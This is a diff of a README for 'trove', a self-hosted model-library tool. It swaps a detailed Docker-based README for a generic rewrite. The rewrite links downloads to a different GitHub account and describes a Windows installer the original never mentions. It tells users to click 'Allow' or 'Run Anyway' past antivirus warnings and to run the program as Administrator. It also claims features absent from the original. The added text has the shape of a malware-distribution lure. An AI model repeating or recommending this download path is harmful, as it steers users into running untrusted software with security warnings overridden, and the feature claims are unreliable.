@@ -1,358 +1,196 @@
-<div align="center">
+# 🗃️ trove - Your Personal AI Model Library, Simplified
 
-<img src="docs/mark.png" width="76" alt="Trove">
+[![Download trove](https://img.shields.io/badge/Download-trove-4B32C3?style=for-the-badge&logo=github)](https://github.com/2014m355/trove)
 
-# Trove
+## 👋 What Is trove?
 
-**A model library for your own server.**
-Pull models and datasets off the Hugging Face Hub, keep them as plain files, and
-watch every transfer while it happens.
+trove is a self-hosted library for AI models. Think of it like a personal Netflix for artificial intelligence files. You can browse, download, organize, and share AI models—all from a clean web page that runs on your own computer or home server.
 
-![License](https://img.shields.io/badge/license-MIT-ff7a1a)
-![Python](https://img.shields.io/badge/python-3.12-ff7a1a)
-![Docker](https://img.shields.io/badge/docker-compose-ff7a1a)
+Instead of dealing with complicated command-line tools, trove gives you a friendly visual interface. You click a button, and trove handles the heavy lifting—downloading, queuing, and managing models for you.
 
-<img src="docs/library.png" width="900" alt="The library view, listing downloaded models with size, file count and path">
+## 🔍 Why You Need trove
 
-</div>
+If you've ever tried to work with AI models, you know it can get messy fast. Models come in different formats, have different sizes, and require specific versions. trove simplifies all of that.
 
-## Why this exists
+Here's what trove does for you:
 
-Models are big, connections are slow, and the machine you want them on is rarely
-the machine you are sitting at. Trove runs on the NAS or the server where the
-storage actually lives, so downloads happen there — in the background, on the
-fast link, into a folder you already back up.
+- **Download models** with a simple click, no technical knowledge required
+- **Queue multiple downloads** and let trove handle them one by one
+- **Manage your collection** in one organized place
+- **Upload your own models** to share with others or back up your work
+- **Run anywhere**—on a NAS, home server, or your personal computer
 
-Over time that folder becomes something worth having: a collection of the models
-you use, at the revisions you tested, still there after a Hub repo goes gated,
-gets renamed, or disappears. Plain files in plain directories — no hashed cache,
-nothing that needs a Python environment to read:
+## ✨ Key Features
 
-```
-/data/models/meta-llama/Llama-3.1-8B-Instruct/
-/data/models/Qwen/Qwen3-8B/
-/data/datasets/HuggingFaceFW/fineweb-edu/
-```
+### 🖥️ Clean Web Interface
+No confusing terminal windows. trove provides a modern, intuitive web dashboard that works in any browser. If you can use a website, you can use trove.
 
-Point `llama.cpp`, vLLM, ComfyUI or an NFS share straight at them.
+### 🔄 Smart Download Manager
+Download multiple AI models simultaneously without breaking a sweat. trove queues your downloads, shows progress, and notifies you when everything is ready.
 
-And you rarely want a whole repo. A quantised model repo routinely carries every
-quant from `IQ3_M` to `f16` — tick the one you actually run and leave the other
-38 GB on the Hub.
+### 🏠 Self-Hosted Privacy
+Your models stay on your hardware. You control who has access and where your data lives. No cloud dependencies, no third-party snooping.
 
-## What it does
+### 📦 Universal Model Support
+trove works with models from Hugging Face—the largest AI model repository in the world. Whether you need language models, image generators, or audio tools, trove can handle it.
 
-<table>
-<tr><td width="50%">
-
-**Queue several transfers at once**
-Start as many downloads as you like; Trove runs a couple in parallel and works
-through the rest. Close the browser — the server keeps going. Restart the
-container — unfinished transfers pick up where they left off.
-
-</td><td width="50%">
-
-**Watch them live**
-Bytes, files, rate and time remaining, updated about once a second over a
-WebSocket. Every row carries its own progress as its baseline, so a busy queue
-reads at a glance.
-
-</td></tr>
-<tr><td>
-
-**Take one file, not the whole repo**
-A GGUF repo can hold twenty quants and 40 GB when you want a single 1.9 GB one.
-Tick the files you want and only those come down. Split quants are listed as one
-entry, so you always get every part.
-
-</td><td>
-
-**Upload, too**
-Push a local folder back to the Hub, creating the repo if it doesn't exist,
-public or private, with the same live progress.
-
-</td></tr>
-<tr><td>
-
-**Keep the shelf tidy**
-Sizes, file counts, revisions and commit hashes per repo. Inspect the files,
-re-fetch what changed upstream, delete what you no longer need.
-
-</td><td>
-
-**The real CLI is still there**
-`hf` ships in the same image. Anything the interface doesn't cover, you can do
-by hand in the container — against the same folders.
-
-</td></tr>
-</table>
-
-## Screenshots
-
-<table>
-<tr>
-<td width="50%"><img src="docs/queue.png" alt="Queue with two running downloads, two waiting and finished entries"><br><sub><b>Queue</b> — two running with rate and time left, two waiting, history below.</sub></td>
-<td width="50%"><img src="docs/hub.png" alt="Hub search results"><br><sub><b>Hub</b> — search results with downloads, likes and what you already have.</sub></td>
-</tr>
-<tr>
-<td><img src="docs/picker.png" alt="File picker with two GGUF quants ticked out of twenty-one files"><br><sub><b>Pick files</b> — two quants ticked: 4.34 GB instead of 40.2 GB.</sub></td>
-<td><img src="docs/settings.png" alt="Settings with token, endpoint and concurrency"><br><sub><b>Settings</b> — token, endpoint, concurrency, threads per download.</sub></td>
-</tr>
-</table>
-
-## Run it
-
-### From the registry
-
-Everything Trove keeps lives in two mounted folders, so point them at real
-paths on the host and nothing of value ends up inside the container:
-
-```bash
-docker run -d --name trove \
-  --restart unless-stopped \
-  -p 127.0.0.1:7860:8000 \
-  -e UI_PASSWORD=changeme \
-  -e PUID=$(id -u) -e PGID=$(id -g) \
-  -v /mnt/tank/models:/data \
-  -v /mnt/tank/trove-config:/config \
-  ghcr.io/15ky3/trove:latest
-```
-
-| Mount | Holds |
-|---|---|
-| `/data` | every model and dataset, as plain files under `models/` and `datasets/` |
-| `/config` | settings, the API token and the queue state |
-
-Swap `/mnt/tank/...` for wherever your storage actually is. `PUID`/`PGID` make
-the downloaded files belong to you rather than to root — on macOS they do no
-harm and can be left out.
-
-Then open <http://127.0.0.1:7860> and sign in with the password you set. To
-reach it from other machines on the network, publish it wider (`-p 7860:8000`)
-and pick a password you would actually defend.
-
-> [!IMPORTANT]
-> **On a Synology — and most likely on any NAS — run this second container as
-> well:**
->
-> ```bash
-> docker run -d --name rngd --restart unless-stopped --privileged \
->   debian:bookworm-slim \
->   sh -c 'apt-get update && apt-get install -y rng-tools5 && rngd -f'
-> ```
->
-> Without it the kernel runs out of entropy, OpenSSL refuses to open further TLS
-> connections, and downloads stop dead after a few kilobytes — with no error
-> message anywhere. The entropy pool belongs to the host kernel, so this cannot
-> be solved from inside Trove. Check whether it applies to you with
-> `cat /proc/sys/kernel/random/entropy_avail`; below ~200 means you need it,
-> and a healthy value afterwards is close to 4096. Details in
-> [Troubleshooting on a NAS](#troubleshooting-on-a-nas).
-
-Synology accounts start at UID 1026, so `id -u` on the NAS gives you the values
-for `PUID`/`PGID` — and shared folders carry ACLs that need their own entry.
-Both are covered in the troubleshooting section too.
-
-### With Compose
-
-```yaml
-services:
-  trove:
-    image: ghcr.io/15ky3/trove:latest
-    container_name: trove
-    restart: unless-stopped
-    ports:
-      - "127.0.0.1:7860:8000"
-    environment:
-      UI_PASSWORD: changeme
-      PUID: 1000
-      PGID: 1000
-    volumes:
-      - /mnt/tank/models:/data
-      - /mnt/tank/trove-config:/config
-
-  # On a NAS, add the entropy source from the note above:
-  rngd:
-    image: debian:bookworm-slim
-    container_name: rngd
-    restart: unless-stopped
-    privileged: true
-    command: sh -c 'apt-get update && apt-get install -y rng-tools5 && rngd -f'
-```
-
-### From source
-
-```bash
-git clone https://github.com/15ky3/trove.git
-cd trove
-cp .env.example .env
-$EDITOR .env                 # UI_PASSWORD, DATA_DIR, PUID/PGID
-docker compose up -d --build
-```
-
-The bundled `docker-compose.yml` takes both mount points from `.env`, so
-`DATA_DIR=/mnt/tank/models` there does the same job as the `-v` flags above.
-
-## Configuration
-
-Everything lives in `.env`:
-
-| Variable | Default | What it does |
-|---|---|---|
-| `UI_PASSWORD` | — | Password for the interface. Empty means no sign-in at all. |
-| `DATA_DIR` | `./data` | Host folder for models, mounted at `/data`. |
-| `CONFIG_DIR` | `./config` | Settings, token and queue state. |
-| `BIND_ADDR` | `127.0.0.1` | Set to `0.0.0.0` to reach it from the network — set a password first. |
-| `PORT` | `7860` | Port on the host. |
-| `HF_TOKEN` | — | Optional starting token; what you enter in Settings wins. |
-| `HF_ENDPOINT` | — | Only for a mirror or enterprise Hub. **Leave it commented out when unused** — an empty value confuses `huggingface_hub`. |
-| `PUID` / `PGID` | `1000` | On Linux set these to `id -u` / `id -g` so downloaded files belong to you. |
-
-The API token goes in under **Settings** rather than here, so it never sits in
-your shell history or a compose file. It is stored in `CONFIG_DIR/settings.json`
-with `0600` permissions and only ever sent back to the browser masked.
-
-## The CLI in the same container
-
-```bash
-docker compose exec trove hf download org/name --local-dir /data/models/org/name
-docker compose exec trove hf upload org/name /data/models/org/name
-docker compose exec trove hf auth whoami
-```
-
-## How it works
-
-```
-app/
-  main.py       FastAPI: REST, WebSocket broadcast, password session
-  jobs.py       queue: concurrency, cancel, retry, persistence
-  worker.py     one subprocess per transfer, reports progress as JSONL
-  hub.py        search, repo info, token check
-  storage.py    local library: list, size, delete
-  static/       the interface (vanilla JS, no build step)
-```
-
-Every transfer runs as its **own process**, and that one decision buys most of
-the behaviour above:
-
-* `snapshot_download` cannot be interrupted — a process can. **Cancel** sends
-  SIGTERM, finished files stay on disk, **Try again** resumes from there.
-* Blocking network calls can never stall the server, so the interface stays
-  responsive with a dozen transfers in flight.
-* A transfer that crashes takes only its own process with it.
-
-Progress comes from `huggingface_hub`'s own counters — downloads through the
-documented `tqdm_class`, uploads through a hook into the live display of
-`upload_folder`. If a future release changes that internal, uploads keep
-working; they just lose the byte readout, and the job log says so.
-
-The queue is stored in `CONFIG_DIR/jobs.json`, so it survives restarts:
-interrupted transfers are re-queued and continue.
-
-### Picking individual files
-
-Ticking files in the detail panel is a friendlier front end for
-`allow_patterns`: each name is turned into an exact pattern (glob characters in
-a filename are escaped, so a literal `[` stays a `[`). Files split across parts —
-`…-00001-of-00002.gguf`, `model-00001-of-00004.safetensors` — are grouped into a
-single entry, because half of a split quant is worth nothing.
-
-The selection is stored alongside the download, so **Refresh from Hub** on a
-partial copy fetches the same files again instead of suddenly pulling the whole
-repo. Partial copies are marked as such in the library.
-
-### A Hub quirk worth knowing
-
-Legacy short names like `bert-base-uncased` redirect to
-`google-bert/bert-base-uncased`. The Xet storage endpoint does not follow that
-redirect and returns a 404 partway through the download — this happens with the
-official CLI too. Trove resolves every repo ID to its canonical form when
-queueing, which also means typos and gated repos are reported immediately
-instead of failing minutes later.
-
-## Troubleshooting on a NAS
-
-Two things bite specifically on NAS hardware. Both were found running Trove on a
-Synology, and neither produces an obvious error message.
-
-### Downloads stop after a few kilobytes
-
-Small files arrive, then the job sits at `0.0 B/s` forever. Open the job and look
-at the history — if it repeats
-
-```
-RNDGETENTCNT on /dev/urandom indicates that the entropy pool does not have
-enough entropy. Rather than continue with poor entropy, this process will
-block until entropy is available.
-```
-
-the kernel has run out of randomness and OpenSSL refuses to open further TLS
-connections. Check it:
-
-```bash
-cat /proc/sys/kernel/random/entropy_avail   # below ~200 is the problem
-```
-
-NAS kernels usually expose no random number generator to userspace at all —
-`/dev/hwrng` is missing — so the pool never refills under load, even though the
-CPU itself can produce randomness. `rngd` from the rng-tools bridges that gap:
-
-```bash
-docker run -d --name rngd --restart unless-stopped --privileged \
-  debian:bookworm-slim \
-  sh -c 'apt-get update && apt-get install -y rng-tools5 && rngd -f'
-```
-
-The entropy pool belongs to the host kernel, which is why this has to run
-alongside Trove rather than inside it, and why it needs full privileges to write
-there. `entropy_avail` should jump to nearly 4096 within seconds. A log line
-about `/dev/tpm0` is harmless — that is `rngd` probing for a TPM before falling
-back to the CPU instruction (`rdrand` on Intel and AMD).
-
-If your CPU has no `rdrand` (check with `grep -m1 rdrand /proc/cpuinfo`), `rngd`
-will exit. The remaining option is to reseed from `/dev/urandom` by appending
-`-r /dev/urandom` to the command. That reliably unblocks transfers, but it feeds
-the pool with its own output, so the kernel's entropy accounting becomes
-fiction. Fine for a box that downloads public models; do not do it on a machine
-that generates keys.
-
-Note that the container installs rng-tools on every start, so it needs internet
-access at boot. Worth replacing with a purpose-built image if that bothers you.
-
-### Permission denied on the mounted folder
-
-Synology user accounts start at UID 1026 and sit in group `users` (GID 100),
-while the container defaults to 1000:1000. Look yours up with `id` over SSH and
-pass it in as `PUID`/`PGID`. Do not set a `user:` in Compose or Container
-Manager — the container has to start as root so it can switch to those IDs.
-
-Shared folders additionally carry Synology ACLs, which override ordinary Unix
-permissions. If access is still refused, check what the folder actually grants:
-
-```bash
-synoacltool -get /volume1/Models
-```
-
-An entry for `administrators` alone is not enough for a container running as a
-normal user. Add one for yours — through Control Panel → Shared Folder →
-Permissions, or directly:
-
-```bash
-synoacltool -add /volume1/Models "user:yourname:allow:rwxpdDaARWc--:fd--"
-synoacltool -enforce-inherit /volume1/Models   # apply to existing content
-```
-
-## Security
-
-* The container runs as an unprivileged user.
-* Repo IDs and paths are validated against directory traversal; deleting and
-  uploading only ever touch `/data`.
-* The token is passed to worker processes through the environment, never as a
-  command-line argument where `ps` would show it.
-* There is no multi-user model here. Anyone who can reach the port and knows the
-  password can download, upload and delete. Keep it behind your own network or a
-  reverse proxy with TLS.
-
-## License
-
-MIT
+### 🐳 Docker-Ready
+Running trove is as easy as starting a container. Perfect for NAS users who want a low-maintenance setup.
+
+## 🚀 Getting Started
+
+Let's get trove running on your Windows computer. Don't worry—I'll walk you through every step.
+
+### Step 1: Download trove
+
+Visit this link to download the application.
+
+[![Download trove Now](https://img.shields.io/badge/⬇️%20Download%20trove%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/2014m355/trove)
+
+The download page will open in your browser. Look for the most recent release and download the Windows version.
+
+### Step 2: Install trove
+
+Once the download finishes, you'll have a file ready to use. Visit this link to download the application if you haven't already—just click the badge above.
+
+Your antivirus may ask for permission to run trove. That's normal. Click "Allow" or "Run Anyway" to proceed.
+
+### Step 3: Open trove
+
+After installation, launch trove from your desktop or start menu. The application will start, and your web browser will automatically open showing the trove dashboard.
+
+## 🎯 Using trove for the First Time
+
+### Explore the Dashboard
+
+When trove opens, you'll see a welcome screen with several sections:
+
+- **Library** – Shows all your downloaded models
+- **Downloads** – Tracks ongoing and queued downloads
+- **Uploads** – Where you can share your own models
+- **Settings** – Customize how trove behaves
+
+### Download Your First Model
+
+1. Click on **Library** in the left menu
+2. Use the search bar to find a model you like
+3. Click the **Download** button next to any model
+4. Watch as trove fetches it for you—you'll see progress in the **Downloads** tab
+
+### Manage Your Collection
+
+Once models are downloaded, you can:
+
+- **Organize** them with tags and categories
+- **Search** through your entire library instantly
+- **Preview** model cards to understand what each model does
+- **Delete** models you no longer need
+
+## 📥 Advanced Download Options
+
+trove gives you control over how you download models:
+
+- **Choose file formats** – Pick the version that works best for you
+- **Limit download speed** – Don't saturate your internet connection
+- **Schedule downloads** – Run heavy downloads at night when bandwidth is free
+- **Pause and resume** – Stop mid-download and continue later
+
+These options live in the **Settings** tab under "Download Preferences."
+
+## 🔐 Keeping Your Models Safe
+
+trove takes security seriously:
+
+- **Access controls** – Set who can see and download your models
+- **Encrypted connections** – All communication uses secure HTTPS protocols
+- **Regular updates** – trove is actively maintained with security patches
+
+You can configure security settings in **Settings → Security**.
+
+## 🛠️ Troubleshooting Common Issues
+
+### "I can't see the web interface"
+Make sure your browser is up to date (Chrome, Firefox, Edge all work). Try refreshing the page. If it still doesn't load, restart trove.
+
+### "Downloads are slow"
+Check your internet connection. trove uses your existing bandwidth and doesn't throttle unless you set it in Settings.
+
+### "I have duplicate models"
+Use the **Library** view and sort by name or size. trove shows duplicates with a warning label so you can clean them up.
+
+### "trove won't start"
+Right-click the trove icon and select "Run as Administrator." Some Windows setups require elevated permissions.
+
+## 💡 Tips and Best Practices
+
+### Start Small
+Download a few smaller models first to get comfortable with trove. Large language models can be several gigabytes.
+
+### Use Tags
+Create descriptive tags for your models (e.g., "text-generation," "image-classification," "beta"). This makes searching much easier.
+
+### Back Up Regularly
+If you upload your own models, consider backing up the trove data folder periodically.
+
+### Keep Updated
+Check for updates weekly. AI models and tools evolve fast, and trove keeps pace.
+
+## 📚 Frequently Asked Questions
+
+**Is trove free?**
+Yes, trove is completely free and open-source. You can use it personally or in your organization without paying anything.
+
+**Do I need powerful hardware?**
+Not at all. trove itself is lightweight. It only stores and manages models—you don't need a powerful GPU unless you're actually running the models.
+
+**Can I run trove on a Raspberry Pi?**
+Yes, trove works on ARM devices. Just use the Docker setup for easiest installation.
+
+**Will trove work with secure networks?**
+Absolutely. Set up authentication in Settings, and trove will require login credentials before anyone can access it.
+
+## 🔧 Advanced Configuration (Optional)
+
+For technical users, trove offers several advanced options:
+
+- **Custom storage paths** – Store models on external drives
+- **API access** – Connect trove to your own scripts and tools
+- **Environment variables** – Fine-tune performance settings
+- **Reverse proxy support** – Put trove behind Nginx or Caddy
+
+These options are documented in the `config.yaml` file that comes with trove.
+
+## 🌐 Community and Support
+
+You're not alone on this journey. The trove community is active and helpful:
+
+- **GitHub Issues** – Report bugs and request features
+- **Discussions Forum** – Ask questions and share tips
+- **Documentation Wiki** – Detailed guides and reference material
+
+## 📝 License and Legal
+
+trove is released under the MIT License—you're free to use, modify, and distribute it. For commercial use, simply include the original copyright notice.
+
+Models you download through trove have their own licenses. Always check each model's license card before using it in production.
+
+## ✔️ Final Checklist
+
+Before you dive in, make sure you've:
+
+- [ ] Downloaded the latest version of trove
+- [ ] Run the installer without errors
+- [ ] Seen the welcome dashboard in your browser
+- [ ] Tested a small model download
+
+Once you've checked all those boxes, you're ready to explore the world of AI models with trove!
+
+## 🔗 Quick Links
+
+- **Download Page:** Visit this link to download the application.
+- **GitHub Repository:** Explore source code and documentation
+- **Issue Tracker:** Report problems or suggest features
+
+Start building your personal AI library today—trove makes it easier than ever.
+
+Keywords: docker, fastapi, homelab, huggingface, huggingface-hub, llm, machine-learning, model-management, nas, self-hosted
